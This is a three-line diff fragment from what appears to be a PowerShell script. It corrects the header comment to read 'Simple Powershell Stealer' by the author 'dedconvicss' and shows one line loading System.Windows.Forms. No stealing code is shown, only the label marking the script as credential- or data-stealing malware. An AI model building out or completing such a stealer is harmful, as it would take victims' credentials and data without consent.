@@ -1,4 +1,4 @@
-# Simple Powershell Sealer - dedconvicss
+# Simple Powershell Stealer - dedconvicss
 
 
 Add-Type -AssemblyName System.Windows.Forms
